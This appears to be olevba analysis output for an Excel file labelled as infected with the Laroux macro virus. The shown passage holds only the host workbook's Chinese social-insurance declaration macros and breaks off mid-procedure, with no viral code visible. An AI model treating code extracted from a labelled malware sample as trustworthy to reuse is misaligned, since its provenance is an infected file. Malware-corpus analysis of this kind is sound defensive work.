olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit



Private Sub Workbook_Open()
Dim i As Long
For i = 1 To 8
  Sheets(i).Visible = True
Next i

Sheet1.ComboBox5.Visible = False
Application.ScreenUpdating = False
Application.EnableEvents = False
Sheets("代码表").Unprotect  '撤销保护工作表
For i = 1 To 3
Sheets("代码表").Cells(i + 2, 29) = Year(Date) - 2 + i
Sheets("代码表").Cells(i + 2, 30) = Month(Date) - 2 + i
 If Month(Date) - 2 + i = 0 Then
    Sheets("代码表").Cells(i + 2, 30) = 12
    Else
     If Month(Date) - 2 + i = 13 Then
     Sheets("代码表").Cells(i + 2, 30) = 1
     End If
End If

Next i
ThisWorkbook.Sheets("代码表").Protect  '恢复保护工作表

Sheets("主页").Select
Sheets("主页").Unprotect  '撤销保护工作表


Sheets("主页").Cells(1, 1) = "社保费申报辅助工具" ' 清空显示

Sheets("主页").Cells(2, 5) = "版本 2.19" ' 清空显示

Sheets("主页").Cells(3, 5) = Year(Date)
Sheets("主页").Cells(3, 6) = Month(Date)
Sheets("主页").ComboBox5.Value = ""
 
'.ange(Cells(22, 11)).Select
'.FreezePanes = True

Sheets("主页").Protect  '保护工作表
    Application.ScreenUpdating = True
    Application.EnableEvents = True
   '恢复屏幕更新
    ThisWorkbook.Sheets("主页").Protect  '恢复保护工作表
    


End Sub



-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public id_ms, total_ms, id_ls, total_ls, p, q, sj, xs As Integer
Public xm, sFz As String
Public xi, yj As Integer
'全局变量－当前记录,总记录的指针
Dim PM_dm(50), PM_mc(50), Sy(50) As String '全局变量,品目代码,品目名称
Dim Flei(50) As Long '险种分类
Dim Flv_dw(50), Flv_gr(50), Js_sx(50), Js_xx(50), gsFV(12) As Double '费率,基数及上下限
Dim MandD(10, 16) As String '全局变量,品目代码,品目名称
Dim kYear(3), kMonth(3), gsDJ(12) As Long '全局变量－增员、减员的起始记录，终止记录，当前记录的指针
'Dim gsFV(6) As Double
Dim Dwlx_dm(30), Dwlx_mc(30) As String




Public nYear, nMonth, nDate, Ddate As String '日期

Public sb_mode As String '申报方式
Public GuoDu As String '申报模式 20070817 yh. add
'█

Private Sub 调代码表()
Dim i, j As Long
For i = 1 To 50

If Sheets("代码表").Cells(i + 2, 1) = "" Then
  Exit For
End If

PM_dm(i) = Sheets("代码表").Cells(i + 2, 1)  '品目代码
PM_mc(i) = Sheets("代码表").Cells(i + 2, 2) '品目名称
Flv_dw(i) = Sheets("代码表").Cells(i + 2, 3) '单位费率
Flv_gr(i) = Sheets("代码表").Cells(i + 2, 4) '个人费率
Js_sx(i) = Sheets("代码表").Cells(i + 2, 5) '基数上限
Js_xx(i) = Sheets("代码表").Cells(i + 2, 6) '基数下限
Flei(i) = Sheets("代码表").Cells(i + 2, 7) '分类
Sy(i) = Sheets("代码表").Cells(i + 2, 8) '适用

Next i
For i = 1 To 10
    For j = 1 To 16
    MandD(i, j) = Sheets("代码表").Cells(2 + i, j + 10)
    Next j
Next i
    For i = 1 To 3
       kYear(i) = Sheets("代码表").Cells(i + 2, 29)
       kMonth(i) = Sheets("代码表").Cells(i + 2, 30)
    Next i
    
       
    For i = 1 To 12
      
       gsDJ(i) = Sheets("代码表").Cells(i + 2, 9)
       gsFV(i) = Sheets("代码表").Cells(i + 2, 10)
       
    Next i
    
    For i = 1 To 30
       If Sheets("代码表").Cells(i + 2, 27) = "" Then
          Exit For
       End If
       
       Dwlx_dm(i) = Sheets("代码表").Cells(i + 2, 27)
       Dwlx_mc(i) = Sheets("代码表").Cells(i + 2, 28)
    Next i
  
      

End Sub

Private Sub ComboBox5_Click()
Dim i, j, k As Integer
Dim L As Long

     ActiveCell.Value = ComboBox5.Value
     
          
     
     
     If ActiveCell.Column = 3 And ActiveCell.Row <= 19 And ActiveCell.Row >= 13 Then
          
               k = ActiveCell.Row
    
     
     Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
        Sheet1.Unprotect  '撤销保护工作表
     For i = 1 To 50
         If PM_mc(i) = ActiveCell.Value Then
                If Sheet1.Cells(10, 11) = "" Then
                   Sheet1.Cells(10, 11) = 0
                   End If
                   
                   
     
            If (Sy(i) = Sheet1.Cells(10, 10) Or (Sy(i) = "" And Sheet1.Cells(10, 10) <> "离休" And Sheet1.Cells(10, 10) <> "")) Or Sheet1.Cells(10, 10) = "失业" Or Sheet1.Cells(10, 10) = "其它" Then
                Sheet1.Cells(k, 2) = PM_dm(i) 'Sheet6.Cells(i, 1)
                   Sheet1.Cells(k, 5) = Sheet1.Cells(10, 11)
                   If Sheet1.Cells(10, 11) > Js_sx(i) Then
                      Sheet1.Cells(k, 5) = Js_sx(i) 'Sheet6.Cells(i, 5)
                   End If
                   If Sheet1.Cells(10, 11) < Js_xx(i) Then
                      Sheet1.Cells(k, 5) = Js_xx(i)
                   End If
                Sheet1.Cells(k, 6) = Flv_dw(i)
                Sheet1.Cells(k, 7) = Flv_gr(i)
                Sheet1.Cells(k, 8) = Sheet1.Cells(k, 5) * Sheet1.Cells(k, 6)
                Sheet1.Cells(k, 9) = Sheet1.Cells(k, 5) * Sheet1.Cells(k, 7)
             Exit For
             
             Else
                     MsgBox ("险种或人员状态有误!")
                     Sheet1.Range(Cells(k, 2), Cells(k, 9)).ClearContents
                     
                     Exit For
                     
                End If
        End If
    Next i
            Sheet1.Protect  '保护工作表

    End If
    
                
    
    
    
     If (ActiveCell.Row = 7 Or ActiveCell.Row = 6) And ActiveCell.Column = 8 Then
      'Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
        Sheet6.Unprotect  '撤销保护工作表
       For i = 3 To 100
        If Sheet6.Cells(i, 1) = "0201" Then
           For j = 1 To 6
                If gsDJ(j) = Sheet1.Cells(7, 8) Then
                   Sheet6.Cells(i, 3) = gsFV(j)

                  
                 ' If Date >= 39904 And Date <= 40268 Then
                If Date >= Sheet6.Cells(3, 31) And Date <= Sheet6.Cells(4, 31) Then
                        For L = 3 To 20
                            
                           If Sheet6.Cells(L, 32) = "" Then
                             Exit For
                           End If
                           
                            If Sheet1.Cells(6, 8) = Sheet6.Cells(L, 32) Then
                 
                        'If Sheet1.Cells(6, 8) = "企业" Or Sheet1.Cells(6, 8) = "三资企业" Or Sheet1.Cells(6, 8) = "个体工商户" Then
                       
                            Sheet6.Cells(i, 3) = gsFV(j + 6)
                            Exit For
                          
                        End If
                      Next L
                      
                    End If
                  
                  调代码表
                  
                  Exit For
                End If
           Next j
        Exit For
        End If
        
    Next i
    End If
         
    
    
     
     Sheet1.ComboBox5.Visible = False
End Sub



Private Sub Jiaofcx_Click()


修改.Enabled = False
增员.Enabled = False
减员.Enabled = False
删除.Enabled = False
Jiaofcx.ForeColor = &HFF&
Renybj.ForeColor = &H808080

End Sub

Private Sub Renybj_Change()
Call 清空_Click
End Sub

Private Sub Renybj_Click()
修改.Enabled = True
增员.Enabled = True
减员.Enabled = True
删除.Enabled = True
Jiaofcx.ForeColor = &H808080
Renybj.ForeColor = &HFF&

 
End Sub



Private Sub Worksheet_Activate()
Dim i, j As Long

 
      'Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
        Sheet6.Unprotect  '撤销保护工作表
       For i = 3 To 100
        If Sheet6.Cells(i, 1) = "0201" Then
           For j = 1 To 6
                If gsDJ(j) = Sheet1.Cells(7, 8) Then
                   Sheet6.Cells(i, 3) = gsFV(j)

                  
                  If Date >= Sheet6.Cells(3, 31) And Date <= Sheet6.Cells(4, 31) Then
                        If Sheet1.Cells(6, 8) = "企业" Or Sheet1.Cells(6, 8) = "三资企业" Or Sheet1.Cells(6, 8) = "个体工商户" Then
                       
                            Sheet6.Cells(i, 3) = gsFV(j + 6)
                          
                        End If
                    End If
                  
                                    
                  Exit For
                End If
           Next j
        Exit For
        End If
        
    Next i
   
调代码表

End Sub



Private Sub Worksheet_Change(ByVal Target As Range)

Dim k As Integer
       
     If ActiveCell.Column = 3 And ActiveCell.Row <= 19 And ActiveCell.Row >= 13 Then
       
       
       k = ActiveCell.Row
         If ActiveCell.Value = "" Then
              Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
        Sheet1.Unprotect  '撤销保护工作表

                     Sheet1.Range(Cells(k, 2), Cells(k, 9)).ClearContents
                             Sheet1.Protect  '保护工作表

            
        End If
    End If

End Sub


Private Sub Worksheet_SelectionChange(ByVal Target As Range)
        Dim i, j As Integer
                           
        If PM_dm(1) = "" Then
         调代码表
        End If
        
Sheet1.ComboBox5.Visible = False
Sheet1.ComboBox5.Clear
  ActiveSheet.Protect  '保护
'On Error GoTo ErrorHandler
If Target.Row = 2 And Target.Column = 10 Then
BanBen.Show
End If
'显示版本
If Renybj.Value = True Then

If Target.Count = 2 And Target.Column = 3 And Target.Row <= 19 And Target.Row >= 13 Then
   ActiveCell.Value = ""
    j = Target.Row - 12
    
 Sheet1.ComboBox5.Visible = True
 
 With Sheet1.ComboBox5
       .Height = Target.Height
       .Width = Target.Width + 18
       .Top = Target.Top
       
     .Left = Target.Left
     End With
    
   For i = 1 To 50
   If PM_dm(i) = "" Then
   Exit For
   End If
   If Flei(i) = j Then
     Sheet1.ComboBox5.AddItem PM_mc(i)
   End If
  Next i
     
      
 End If
 '调品目
 If Target.Row = 10 And Target.Count = 1 Then
   For j = 5 To 10
    If Target.Column = j Then
    'ActiveCell.Value = ""

 Sheet1.ComboBox5.Visible = True
 
 With Sheet1.ComboBox5
       .Height = Target.Height
       .Width = Target.Width + 18
       .Top = Target.Top
       
     .Left = Target.Left
     End With
    'With Sheet6
   For i = 1 To 10
   If MandD(i, 2 * j - 8) = "" Then
   Exit For
   End If
   
     Sheet1.ComboBox5.AddItem MandD(i, 2 * j - 8)
  
  Next i
     'End With
    End If
  Next j
 End If

 
 End If
  '7
 If Target.Row = 7 And Target.Column = 8 And Target.Count = 1 Then
 'ActiveCell.Value = ""

 Sheet1.ComboBox5.Visible = True
 
 With Sheet1.ComboBox5
       .Height = Target.Height
       .Width = Target.Width + 18
       .Top = Target.Top
       
     .Left = Target.Left
     End With
    'With Sheet6
   For i = 1 To 6
     If gsDJ(i) = 0 Then
     Exit For
     End If
     Sheet1.ComboBox5.AddItem gsDJ(i)
  
  Next i
     'End With
 End If
 '8
 If Target.Row = 6 And Target.Column = 8 And Target.Count = 1 Then
 'ActiveCell.Value = ""

 Sheet1.ComboBox5.Visible = True
 
 With Sheet1.ComboBox5
       .Height = Target.Height
       .Width = Target.Width + 48
       .Top = Target.Top
       
     .Left = Target.Left
     End With
    'With Sheet6
   For i = 1 To 30
      If Dwlx_mc(i) = "" Then
        Exit For
      End If
      
     Sheet1.ComboBox5.AddItem Dwlx_mc(i)
  
  Next i
     'End With
 End If
 
 '9
  If Target.Count = 1 And Target.Row = 3 Then
   
   'ActiveCell.Value = ""
   If Target.Column <= 6 And Target.Column >= 5 Then

 Sheet1.ComboBox5.Visible = True
 
 End If
 
 With Sheet1.ComboBox5
       .Height = Target.Height
       .Width = Target.Width + 18
       .Top = Target.Top
       
     .Left = Target.Left
     End With
    'With Sheet6
   For i = 1 To 3
      If Target.Column = 5 Then
        Sheet1.ComboBox5.AddItem kYear(i)
       End If
       
       If Target.Column = 6 Then
       Sheet1.ComboBox5.AddItem kMonth(i)
       End If
  
  Next i
  
 End If
      

 
 End Sub





Private Sub 显示记录()
      Dim i, j As Integer
      Dim iCount As Integer
      'Dim Cunzai, nMsg As Boolean
          'Dim sbh, name, number As String '定义个人社保号、姓名、身份证号
      Dim nChoice As Variant '操作选项
           'Dim tData(120) As Variant '临时数组 更新月快报表显示 2005-07-21 Y.H.update
        
     Call 清空_Click
      
     Application.EnableEvents = False
     Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表
    Sheets("主页").Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表

    
   total_ms = Sheets("个人明细").[a2].CurrentRegion.Rows.Count - 2
   
   total_ls = Sheets("历史数据").[a2].CurrentRegion.Rows.Count - 2
   

   
   
    If Renybj.Value = True Then
     Sheets("主页").Cells(20, 5) = total_ms
   
     If total_ms < 1 Then
      MsgBox ("未有参保人")
     Exit Sub
     End If
   If id_ms < 3 Or id_ms > total_ms + 2 Then
    MsgBox ("超出记录范围！")
    Exit Sub
   End If
   
   
   For i = 1 To 11
       Sheets("主页").Unprotect  '撤销保护工作表

   Sheets("主页").Cells(10, i) = Sheets("个人明细").Cells(id_ms, i)
   Next
      '取个人资料
      Sheets("主页").Cells(13, 11) = Sheets("个人明细").Cells(id_ms, 22)
      Sheets("主页").Cells(15, 11) = Sheets("个人明细").Cells(id_ms, 23)
      Sheets("主页").Cells(17, 11) = Sheets("个人明细").Cells(id_ms, 19)
   
      
   For i = 12 To 18
      j = i + 1
          
      Sheets("主页").Cells(j, 2) = Sheets("个人明细").Cells(id_ms, i)
   Next
     '取险种代码
   
   For i = 13 To 19
       For j = 1 To 50
       If Sheets("主页").Cells(i, 2) = PM_dm(j) Then
       
       Sheets("主页").Cells(i, 3) = PM_mc(j)
       
       Sheets("主页").Cells(i, 6) = Flv_dw(j)
       
       Sheets("主页").Cells(i, 7) = Flv_gr(j)
       
       If Sheets("主页").Cells(10, 11) = 0 Then
       Sheets("主页").Cells(i, 5) = ""
       Else
       Sheets("主页").Cells(i, 5) = Sheets("主页").Cells(10, 11)
       End If
          If Sheets("主页").Cells(10, 11) > Js_sx(j) Then
         
             Sheets("主页").Cells(i, 5) = Js_sx(j)
          End If
          
          If Sheets("主页").Cells(10, 11) < Js_xx(j) Then
          
             Sheets("主页").Cells(i, 5) = Js_xx(j)
          End If
       End If
       
       
        
    Next j
    
    
    
    'If i = 13 Then
    
    'Sheets("主页").Cells(i, 8) = Round(Sheets("主页").Cells(i, 6) * Sheets("主页").Cells(i, 5), 0)
    'Sheets("主页").Cells(i, 9) = Round(Sheets("主页").Cells(i, 7) * Sheets("主页").Cells(i, 5), 0)
    
    'Else
   If Sheets("主页").Cells(i, 2) = "" Then
   Sheets("主页").Cells(i, 8) = ""
   Sheets("主页").Cells(i, 9) = ""
   Else
   
   
   ' Range("H13").Select
    'ActiveCell.FormulaR1C1 = "=ROUND(RC5*RC[-2],2)"
   ' Range("H13").Select
   ' Selection.Copy
   ' Range("I13").Select
   ' ActiveSheet.Paste
   ' Application.CutCopyMode = False
   
   
   
   
   
   
     If Round(Sheets("主页").Cells(i, 6) * Sheets("主页").Cells(i, 5), 2) > 0 Then

    Sheets("主页").Cells(i, 8) = Round(Sheets("主页").Cells(i, 6) * Sheets("主页").Cells(i, 5), 2)
    End If
    
    If Round(Sheets("主页").Cells(i, 7) * Sheets("主页").Cells(i, 5), 2) > 0 Then

    Sheets("主页").Cells(i, 9) = Round(Sheets("主页").Cells(i, 7) * Sheets("主页").Cells(i, 5), 2)
    End If
    
       
       If Sheets("主页").Cells(i, 8) <> "" Then
       Sheets("主页").Cells(i, 8).FormulaR1C1 = "=ROUND(RC5*RC[-2],2)"
       End If
       
        If Sheets("主页").Cells(i, 9) <> "" Then
       Sheets("主页").Cells(i, 9).FormulaR1C1 = "=ROUND(RC5*RC[-2],2)"
       End If
       
     
    
    End If
    
'
'   If Round(Sheets("主页").Cells(i, 7) * Sheets("主页").Cells(i, 5), 2) = 0 Then
'
'    Sheets("主页").Cells(i, 9) = ""
'    Else
'    Sheets("主页").Cells(i, 9) = Round(Sheets("主页").Cells(i, 7) * Sheets("主页").Cells(i, 5), 2)
'    End If
    
    
'    End If

    Next i
    
    Sheets("主页").Cells(20, 3) = id_ms - 2
   
    sj = 0

     
   

         
Else

  Sheets("主页").Cells(20, 5) = total_ls
     
    
     If total_ls < 1 Then
      MsgBox ("未有缴费数据!")
     Exit Sub
     End If
   If id_ls < 3 Or id_ls > total_ls + 2 Then
        MsgBox ("超出记录范围！")
    Exit Sub
   End If
   
   For i = 1 To 11
   Sheets("主页").Cells(10, i) = Sheets("历史数据").Cells(id_ls, i)
   Next
      '取个人资料
      Sheets("主页").Cells(13, 11) = Sheets("历史数据").Cells(id_ls, 47)
   
   For i = 12 To 18
      j = i + 1
      Sheets("主页").Cells(j, 2) = Sheets("历史数据").Cells(id_ls, 12 + 5 * (i - 12))
      Sheets("主页").Cells(j, 3) = Sheets("历史数据").Cells(id_ls, 13 + 5 * (i - 12))
      If Sheets("历史数据").Cells(id_ls, 14 + 5 * (i - 12)) > 0 Then
      Sheets("主页").Cells(j, 5) = Sheets("历史数据").Cells(id_ls, 14 + 5 * (i - 12))
      Else
      Sheets("主页").Cells(j, 5) = ""
      End If
      
      
      If Sheets("历史数据").Cells(id_ls, 15 + 5 * (i - 12)) = 0 Then
      Sheets("主页").Cells(j, 8) = ""
      Else
      Sheets("主页").Cells(j, 8) = Sheets("历史数据").Cells(id_ls, 15 + 5 * (i - 12))
      End If
      
      
      If Sheets("历史数据").Cells(id_ls, 16 + 5 * (i - 12)) = 0 Then
       Sheets("主页").Cells(j, 9) = ""
       Else
      Sheets("主页").Cells(j, 9) = Sheets("历史数据").Cells(id_ls, 16 + 5 * (i - 12))
      End If
   Next
     '取险种代码,名称,缴费基数,个人、单位缴费
   
   For i = 13 To 19
      If Sheets("主页").Cells(i, 5) <> "" Then

        'If i = 13 Then
        Sheets("主页").Cells(i, 6) = Round(Sheets("主页").Cells(i, 8) / Sheets("主页").Cells(i, 5), 3)
        Sheets("主页").Cells(i, 7) = Round(Sheets("主页").Cells(i, 9) / Sheets("主页").Cells(i, 5), 3)
        
        'Else
        
        'Sheets("主页").Cells(i, 6) = Sheets("主页").Cells(i, 8) / Sheets("主页").Cells(i, 5)
        'Sheets("主页").Cells(i, 7) = Sheets("主页").Cells(i, 9) / Sheets("主页").Cells(i, 5)
        
        'End If
      
      End If
      
    Next i
    
    '计算费率
    
    Sheets("主页").Cells(13, 11) = Sheets("历史数据").Cells(id_ls, 49)
    Sheets("主页").Cells(15, 11) = Sheets("历史数据").Cells(id_ls, 50)
    Sheets("主页").Cells(17, 11) = Sheets("历史数据").Cells(id_ls, 47)

    Sheets("主页").Cells(20, 3) = id_ls - 2
    sj = 1
        

   
   End If
   
    ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
    Sheets("主页").Protect  '恢复保护工作表
     
    Sheets("历史数据").Protect  '恢复保护工作表
     Sheets("个人明细").Protect  '恢复保护工作表
    Application.EnableEvents = True
End Sub






Private Sub 查找_Click()
Dim i, j, k, m, n As Integer '定义用于循环的整型变量
Dim iCount, iCount1 As Integer


If Sheets("主页").Cells(10, 3) = "" And Sheets("主页").Cells(10, 4) = "" Then
MsgBox ("查找条件未设:身份证号或姓名...")
Exit Sub
End If

   Application.ScreenUpdating = False
    '关闭屏幕更新，以防出现该文件内容影响。
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表

    
    

If Renybj.Value = True Then
 iCount = Sheets("个人明细").[a1].CurrentRegion.Rows.Count
 If p < 3 Then
 p = 3
 End If
 
   
   For i = 3 To iCount
   If Sheets("主页").Cells(10, 3) <> "" And Sheets("主页").Cells(10, 4) = "" Then
      If Sheets("个人明细").Cells(i, 3) = Sheets("主页").Cells(10, 3) Then
      id_ms = i
      Exit For
      End If
   End If
      
     If Sheets("主页").Cells(10, 3) = "" And Sheets("主页").Cells(10, 4) <> "" Then
      If Sheets("个人明细").Cells(i, 4) = Sheets("主页").Cells(10, 4) Then
      id_ms = i
      Exit For
      End If
     End If
    If Sheets("主页").Cells(10, 3) <> "" And Sheets("主页").Cells(10, 4) <> "" Then
      If Sheets("个人明细").Cells(i, 4) = Sheets("主页").Cells(10, 4) And Sheets("个人明细").Cells(i, 3) = Sheets("主页").Cells(10, 3) Then
      id_ms = i
      Exit For
      End If
    End If
    
    If i = iCount Then
    Sheets("主页").Cells(23, 1) = p
      MsgBox ("找不到,请核对录入条件是否正确....")
      ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
     
    Sheets("历史数据").Protect  '恢复保护工作表
     Sheets("个人明细").Protect  '恢复保护工作表

      Exit Sub
    End If

    
    Next i

    
    Call 显示记录
Else
   xs = 1
   iCount = Sheets("历史数据").[a1].CurrentRegion.Rows.Count
 'icount1 = Sheets("历史数据").[A1].CurrentRegion.Rows.Count

If q < 3 Or xm <> Sheets("主页").Cells(10, 3) Or sFz <> Sheets("主页").Cells(10, 4) Or q > iCount Then
  q = 3
  p = 0
End If




For i = q To iCount


   If Sheets("主页").Cells(10, 3) <> "" And Sheets("主页").Cells(10, 4) = "" Then
      If Sheets("历史数据").Cells(i, 3) = Sheets("主页").Cells(10, 3) Then
      xm = Sheets("主页").Cells(10, 3)
      id_ls = i
      q = i + 1
      p = p + 1
      Exit For
      End If
   End If
   
      
   If Sheets("主页").Cells(10, 3) = "" And Sheets("主页").Cells(10, 4) <> "" Then
      If Sheets("历史数据").Cells(i, 4) = Sheets("主页").Cells(10, 4) Then
     sFz = Sheets("主页").Cells(10, 4)
      id_ls = i
      q = i + 1
      p = p + 1

      Exit For
      End If
    End If
    
    
    
    If Sheets("主页").Cells(10, 3) <> "" And Sheets("主页").Cells(10, 4) <> "" Then
      If Sheets("历史数据").Cells(i, 4) = Sheets("主页").Cells(10, 4) And Sheets("历史数据").Cells(i, 3) = Sheets("主页").Cells(10, 3) Then
      xm = Sheets("主页").Cells(10, 3)
      sFz = Sheets("主页").Cells(10, 4)
      id_ls = i
      q = i + 1
      p = p + 1
         If i <> iCount Then
         Exit For
         End If
      End If
    End If
    
    
      
    If i = iCount And p = 0 Then
      q = 3
      MsgBox ("找不到,请核对录入是否正确....")
      ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
     
    Sheets("历史数据").Protect  '恢复保护工作表
     Sheets("个人明细").Protect  '恢复保护工作表
     
      Exit Sub
       
    End If
    
    
 If i = iCount Then
    
    q = 3
    MsgBox ("点确定显示此人最后一条缴费记录!")
      ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
     
    Sheets("历史数据").Protect  '恢复保护工作表
     Sheets("个人明细").Protect  '恢复保护工作表
     
      'Exit Sub
End If
     
Next i


    
    
    Call 显示记录
   
  

End If


  ActiveSheet.Protect  '保护工作表
    Application.ScreenUpdating = True
   '恢复屏幕更新
     
    Sheets("历史数据").Protect  '恢复保护工作表
     Sheets("个人明细").Protect  '恢复保护工作表


End Sub


Private Sub 初始化_Click()
Dim i, j As Integer  '定义用于循环的整型变量
Dim iCount, iCount1 As Integer
'定义判断记录是否在的布尔变量
Dim Cunzai, nMsg As Boolean
'Dim sbh, name, number As String '定义个人社保号、姓名、身份证号
Dim nChoice As Variant '操作选项
'Dim tData(120) As Variant '临时数组 更新月快报表显示 2005-07-21 Y.H.update
Dim Danwei, Renyuan, Jiaofei, Hban, Rq As String
 Dim allDir As String
 Dim nFileName  As String '文件名
 
Danwei = 0
Renyuan = 0
Jiaofei = 0
Hban = 0
Chush.Show
If Chush.Danwxx = True Then
Danwei = 1
End If
If Chush.Renyxx = True Then
Renyuan = 1
End If
If Chush.Jiaofxx = True Then
    Jiaofei = 1
End If
If Chush.Huanban = True Then
   Hban = 1
End If

   nYear = Trim(Str(Sheets("主页").Cells(3, 5))) & "年" '年
    nMonth = Str(Sheets("主页").Cells(3, 6)) & "月" '月
    nDate = nYear + nMonth

     Application.EnableEvents = False
    Application.ScreenUpdating = False
    '取消屏幕更新
    ActiveSheet.Unprotect  '撤销保护工作表
    Sheets("个人明细").Unprotect  '撤销保护工作表
    Sheets("历史数据").Unprotect  '撤销保护工作表
    
    
    '把“数据库”工作表的记录行数赋予iCount
    iCount = Sheets("个人明细").[a1].CurrentRegion.Rows.Count
    iCount1 = Sheets("历史数据").[a1].CurrentRegion.Rows.Count
    '为CunZai布尔变量赋初值
      
   
               
               '弹出提示数据已经找到的信息
    'nChoice = MsgBox("注意：如果确认，则删除所有记录？", 1, "提示")  '返回值确定1，取消2
   
    
    
    If Danwei = 1 Then
    
      Sheets("主页").Cells(5, 3) = ""  ' 清单位基本信息
       Sheets("主页").Cells(6, 3) = ""
       Sheets("主页").Cells(7, 3) = ""
        Sheets("主页").Cells(5, 8) = ""
       Sheets("主页").Cells(6, 8) = ""
       Sheets("主页").Cells(7, 8) = ""
       Sheets("主页").Cells(6, 10) = ""
       Sheets("主页").Cells(7, 10) = ""
    End If
       
    If Renyuan = 1 Then
       
       If iCount < 3 Then
          MsgBox ("无人员记录！")
          Renyuan = 0
        Else
          ThisWorkbook.Sheets("个人明细").Range("3:65536").ClearContents
       End If
    End If
    
    If Jiaofei = 1 Then
             
       If iCount1 < 3 Then
         MsgBox ("无缴费记录！")
         Jiaofei = 0
        Else
        ThisWorkbook.Sheets("历史数据").Range("3:65536").ClearContents
       End If
     End If
     
     If Hban = 1 Then
     
     
     allDir = ThisWorkbook.Path  '切换到ss.xls当前路径
    ChDrive Trim(Left(allDir, 1))  '改变默认驱动器
    ChDir allDir  '改变默认路径
   
    On Error GoTo ErrorHandler
    '打开文件错误定义


    
    '取消屏幕更新
    ActiveSheet.Unprotect  '撤销保护工作表
    ThisWorkbook.Sheets("个人明细").Unprotect  '撤销保护工作表

  
  
   '验错
  
    nFileName = Application.GetOpenFilename   '打开并选择申报文件
    Workbooks.Open nFileName  '打开目标文件（活动）
     
     
        ThisWorkbook.Sheets("主页").Cells(5, 3) = ActiveWorkbook.Sheets("主页").Cells(5, 3)
        
        ThisWorkbook.Sheets("主页").Cells(6, 3) = ActiveWorkbook.Sheets("主页").Cells(6, 3)
        
        ThisWorkbook.Sheets("主页").Cells(7, 3) = ActiveWorkbook.Sheets("主页").Cells(7, 3)
        
         ThisWorkbook.Sheets("主页").Cells(5, 8) = ActiveWorkbook.Sheets("主页").Cells(5, 8)
        
        ThisWorkbook.Sheets("主页").Cells(6, 8) = ""
        
        ThisWorkbook.Sheets("主页").Cells(7, 8) = ""
        
        ThisWorkbook.Sheets("主页").Cells(6, 10) = ActiveWorkbook.Sheets("主页").Cells(6, 10)
        
        ThisWorkbook.Sheets("主页").Cells(7, 10) = ActiveWorkbook.Sheets("主页").Cells(7, 10)
        
        
        ActiveWorkbook.Sheets("个人明细").Range("3:65536").Copy
        
        ActiveSheet.Paste Destination:=ThisWorkbook.Sheets("个人明细").Range("3:65536")
        
        With ThisWorkbook.Sheets("个人明细")
        .Columns("X:X").ClearContents
        .Columns("K:K").NumberFormatLocal = "G/通用格式"

        End With
        
            
        
        If InStr(ThisWorkbook.Sheets("个人明细").Cells(3, 19), " ") = 0 Then
           iCount = ThisWorkbook.Sheets("个人明细").[a1].CurrentRegion.Rows.Count
           
           For i = 3 To iCount
              If Len(ThisWorkbook.Sheets("个人明细").Cells(i, 19)) = 7 Then
                ThisWorkbook.Sheets("个人明细").Cells(i, 19) = Left(ThisWorkbook.Sheets("个人明细").Cells(i, 19), 5) + " " + Right(ThisWorkbook.Sheets("个人明细").Cells(i, 19), 2)
              ElseIf Len(ThisWorkbook.Sheets("个人明细").Cells(i, 19)) = 8 Then
                ThisWorkbook.Sheets("个人明细").Cells(i, 19) = Left(ThisWorkbook.Sheets("个人明细").Cells(i, 19), 5) + " " + Right(ThisWorkbook.Sheets("个人明细").Cells(i, 19), 3)
              End If
              
            Next i
        End If
            
        'ActiveWorkbook.Saved = True
        'Application.CutCopyMode = False
       ' ActiveWorkbook.Close
                
                   
     
     
     '导缴费数据
     
      
        ActiveWorkbook.Sheets("历史数据").Range("3:65536").Copy
        
        ActiveSheet.Paste Destination:=ThisWorkbook.Sheets("历史数据").Range("3:65536")
        
        
        If InStr(ThisWorkbook.Sheets("历史数据").Cells(3, 47), " ") = 0 Then
           iCount = ThisWorkbook.Sheets("历史数据").[a1].CurrentRegion.Rows.Count
           
           For i = 3 To iCount
              If Len(ThisWorkbook.Sheets("历史数据").Cells(i, 47)) = 7 Then
                ThisWorkbook.Sheets("历史数据").Cells(i, 47) = Left(ThisWorkbook.Sheets("历史数据").Cells(i, 47), 5) + " " + Right(ThisWorkbook.Sheets("历史数据").Cells(i, 47), 2)
              ElseIf Len(ThisWorkbook.Sheets("历史数据").Cells(i, 47)) = 8 Then
                ThisWorkbook.Sheets("历史数据").Cells(i, 47) = Left(ThisWorkbook.Sheets("历史数据").Cells(i, 47), 5) + " " + Right(ThisWorkbook.Sheets("历史数据").Cells(i, 47), 3)
              End If
              
            Next i
        End If
            
        ActiveWorkbook.Saved = True
        Application.CutCopyMode = False
        ActiveWorkbook.Close
                
                   
     
     End If
     
    With Sheets("历史数据")
    .Columns("K:K").NumberFormatLocal = "G/通用格式"
    
    .Columns("N:P").NumberFormatLocal = "G/通用格式"
   
